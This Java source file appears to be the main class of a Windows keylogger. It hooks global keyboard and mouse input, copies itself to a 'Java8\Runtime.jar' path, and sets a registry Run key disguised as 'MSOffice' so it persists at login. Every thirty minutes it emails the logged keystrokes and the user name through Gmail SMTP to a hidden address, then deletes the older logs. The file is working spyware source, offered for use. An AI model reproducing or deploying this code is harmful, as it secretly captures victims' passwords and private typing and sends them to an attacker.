package com.mykey.log.mykey;

import java.io.File;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLDecoder;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.sql.Timestamp;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import com.github.sarxos.winreg.HKey;
import com.github.sarxos.winreg.RegistryException;
import com.github.sarxos.winreg.WindowsRegistry;

/**
 * Hello world!No elo Co tam xD No halko
 *
 */
public class App {
	static File logDirectory;
	static File inputLogger;
	static URI currentPath;
	static File appDirectory;
	static KeyListener keyboard;
	static MouseListener mouse;

	public static void main(String[] args) {
		try {
			sendMail();
		} catch (AddressException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (MessagingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			CreateEnviroment();
			GlobalScreen.registerNativeHook();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		keyboard = new KeyListener();
		mouse = new MouseListener();
		try {
			if (WindowsRegistry.getInstance().readString(HKey.HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\run",
					"MSOffice") == null)
				WindowsRegistry.getInstance().writeStringValue(HKey.HKCU,
						"Software\\Microsoft\\Windows\\CurrentVersion\\run", "MSOffice",
					"\"" + System.getProperty("user.home") + "\\Java8\\Runtime.jar\"");
		} catch (RegistryException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void CreateEnviroment() throws IOException {
		// Creates a folder in users/'currentUserDirectory'noe
		logDirectory = new File(System.getProperty("user.home"), "MSOffice");
		if (!logDirectory.exists())
			logDirectory.mkdir();
		// Creates a folder witch will contain a jar file to execute
		appDirectory = new File(System.getProperty("user.home"), "Java8");
		if (!appDirectory.exists()) {
			appDirectory.mkdir();
			try {
				currentPath = App.class.getProtectionDomain().getCodeSource().getLocation().toURI();
				CopyOption[] options = new CopyOption[] { StandardCopyOption.REPLACE_EXISTING,
						StandardCopyOption.COPY_ATTRIBUTES };
				try {
					Files.copy(Paths.get(currentPath),
							Paths.get(System.getProperty("user.home") + "\\Java8\\Runtime.jar"), options);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (URISyntaxException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		// Create dayly file with logger contains
		inputLogger = new File(logDirectory, LocalDate.now().toString() + ".txt");
		if (!inputLogger.exists())
			inputLogger.createNewFile();
		// send a mail width attachment files from the user directory

		// Creates new thread that count the time to next day and eventually
		// start this function to create new file
		Timestamp timeStart = Timestamp.valueOf(LocalDateTime.now());
		Timestamp timeEnd = Timestamp.valueOf(LocalDate.now().atStartOfDay().plusDays(1l));
		final Long millisBetween = timeEnd.getTime() - timeStart.getTime();
		Thread changeThread = new Thread(() -> {
			try {
				Thread.sleep(millisBetween);
				CreateEnviroment();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		});
		changeThread.start();
	}

	public static void sendMail() throws IOException, AddressException, MessagingException {
		final String username = "hidden";
		final String password = "hidden";

		Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");

		Session session = Session.getInstance(props, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, password);
			}
		});

		

			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress("hidden"));
			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("hidden"));
			message.setSubject(LocalDateTime.now().toString());

			final Multipart multipart = new MimeMultipart();

			BodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setText(System.getProperty("user.name"));
			multipart.addBodyPart(messageBodyPart);
			for (Object path : Files.walk(Paths.get(System.getProperty("user.home") + "\\" + "MSOffice\\")).toArray()) {
				Path p = (Path) path;
				if (p.toString().contains(".txt")) {
					DataSource source = new FileDataSource(
							p.toString());
					try {
						messageBodyPart = new MimeBodyPart();
						messageBodyPart.setDataHandler(new DataHandler(source));
						messageBodyPart.setFileName(p.getFileName().toString());
						multipart.addBodyPart(messageBodyPart);
					} catch (MessagingException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			}

			// Send the complete message parts
			message.setContent(multipart);

			Transport.send(message);
			if (Files.walk(Paths.get(System.getProperty("user.home") + "\\" + "MSOffice\\")).count() > 1)
				for (Object path : Files.walk(Paths.get(System.getProperty("user.home") + "\\" + "MSOffice\\")).toArray())
				{
					Path p = (Path) path;
					if (!p.toString().contains(LocalDate.now().toString()) && p.toString().contains(".txt"))
						Files.delete(p);
				}
			Thread mailThread = new Thread(() -> {

				try {
					Thread.sleep(1800000l);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					sendMail();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (AddressException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (MessagingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			});
			mailThread.start();

		
	}
}
